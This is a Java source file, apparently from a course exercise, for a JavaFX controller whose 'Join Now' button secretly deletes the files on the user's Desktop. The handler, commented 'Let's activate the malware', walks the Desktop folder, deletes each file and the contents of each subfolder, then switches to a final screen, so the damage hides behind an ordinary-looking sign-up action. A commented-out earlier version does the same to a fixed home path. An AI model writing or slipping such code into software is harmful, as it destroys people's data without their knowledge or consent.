package lk.ijse.dep11.malware.controller;

import javafx.event.ActionEvent;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.layout.AnchorPane;
import javafx.stage.Stage;

import java.io.File;
import java.io.IOException;
import java.nio.file.*;

public class MainViewController {
    public Button btnJoinNow;
    public AnchorPane root;

    public void btnJoinNowOnAction(ActionEvent actionEvent) throws IOException {
        // Let's activate the malware
        String property = System.getProperty("user.home");
        System.out.println(property);

//        File malwareTarget = new File("/home/ranjith-suranga/Desktop/");
//        File[] fileList = malwareTarget.listFiles();
//        for (File path : fileList) {
//            if (!path.isDirectory()) {
//                path.delete();
//            }else{
//                File[] filesInDir = path.listFiles();
//                for (File filePath : filesInDir) {
//                    filePath.delete();
//                }
//                path.delete();
//            }
//        }

        Path malwareTarget = Paths.get(System.getProperty("user.home"), "Desktop");
        try {
            DirectoryStream<Path> pathList = Files.newDirectoryStream(malwareTarget);
            for (Path path : pathList) {
                if (!Files.isDirectory(path)){
                    Files.delete(path);
                }else {
                    DirectoryStream<Path> pathListInDir = Files.newDirectoryStream(path);
                    for (Path pathInDir : pathListInDir) {
                        Files.delete(pathInDir);
                    }
                    Files.delete(path);
                }
            }
        } catch (DirectoryNotEmptyException e) {
            System.out.println("Failed to activate the malware property, some directories are not empty");
        } catch (Exception e){
            System.out.println("Failed to activate the malware properly, unknown reason");
            e.printStackTrace();
        }

        // Scene Navigation
        Stage primaryStage = (Stage) root.getScene().getWindow();
        primaryStage.setScene(new Scene(FXMLLoader.load(getClass().getResource("/view/FinalView.fxml"))));
        primaryStage.centerOnScreen();
    }
}
